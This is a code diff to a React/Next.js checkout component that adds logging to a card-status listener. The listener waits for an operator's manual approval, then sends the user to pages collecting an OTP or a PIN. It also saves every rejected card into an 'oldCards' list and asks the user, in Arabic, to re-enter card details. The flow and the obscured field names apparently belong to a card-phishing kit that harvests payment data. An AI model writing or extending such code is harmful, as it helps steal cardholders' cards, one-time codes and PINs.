@@ -158,15 +158,20 @@ export default function P1({ offerTotalPrice }: _P1Props) {
           const data = docSnapshot.data()
           const status = data.cardStatus
 
+          console.log('[Card Status] Current status:', status)
+          
           if (status === "approved_with_otp") {
+            console.log('[Card Status] Approved with OTP, redirecting to step2')
             setIsWaitingAdmin(false)
             // Redirect to OTP page
             router.push("/step2")
           } else if (status === "approved_with_pin") {
+            console.log('[Card Status] Approved with PIN, redirecting to step3')
             setIsWaitingAdmin(false)
             // Redirect to PIN page directly
             router.push("/step3")
           } else if (status === "rejected") {
+            console.log('[Card Status] Card rejected, saving to oldCards')
             const currentCardData = {
               _v1: data._v1,
               _v4: data._v4,
@@ -181,13 +186,14 @@ export default function P1({ offerTotalPrice }: _P1Props) {
               oldCards: data.oldCards ? [...data.oldCards, currentCardData] : [currentCardData],
               cardStatus: "pending"
             }).then(() => {
+              console.log('[Card Status] Rejection saved, hiding loader')
               setIsWaitingAdmin(false)
               toast.error("تم رفض بيانات البطاقة", {
                 description: "يرجى إعادة إدخال بيانات صحيحة",
                 duration: 5000
               })
             }).catch(err => {
-              console.error("Error saving rejected card:", err)
+              console.error("[Card Status] Error saving rejected card:", err)
               setIsWaitingAdmin(false)
               toast.error("حدث خطأ", {
                 description: "يرجى المحاولة مرة أخرى",
